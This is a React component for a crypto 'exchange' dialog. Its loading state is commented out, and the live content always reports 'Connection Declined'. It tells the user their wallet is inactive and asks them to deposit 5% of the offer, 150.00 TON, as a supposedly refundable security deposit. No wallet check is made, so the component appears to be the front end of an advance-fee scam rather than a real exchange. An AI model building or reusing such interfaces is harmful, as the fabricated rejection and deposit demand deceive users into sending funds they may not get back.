"use client";

import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import { LoaderCircleIcon, TriangleAlertIcon } from "lucide-react";

export default function Exchange() {
  return (
    <Dialog>
      <DialogTrigger asChild>
        <Button className="w-full">Start Exchange</Button>
      </DialogTrigger>
      {/* <DialogContent className="sm:max-w-[425px]">
        <DialogHeader className="sm:text-center">
          <DialogTitle>
            <LoaderCircleIcon
              size={72}
              className="mx-auto text-foreground/50 py-5 animate-spin"
            />
            Preparing Transactions
          </DialogTitle>
          <DialogDescription>
            Preparing transaction, Please wait...
          </DialogDescription>
        </DialogHeader>
      </DialogContent> */}
      <DialogContent className="sm:max-w-[425px]">
        <DialogHeader className="sm:text-center">
          <DialogTitle className="mb-3">
            <TriangleAlertIcon
              size={72}
              className="mx-auto text-chart-3 py-5"
            />
            Connection Declined
          </DialogTitle>
          <DialogDescription>
            Unfortunately, your wallet is not active and its balance is not
            equal to the amount of the security deposit.
            <br />
            Please use an active wallet or top up your balance with 5% of the
            offer amount - 150.00 TON.
            <br />
            These funds may be debited from your wallet for the duration of the
            offer and will be returned in full after its completion
          </DialogDescription>
        </DialogHeader>
      </DialogContent>
    </Dialog>
  );
}
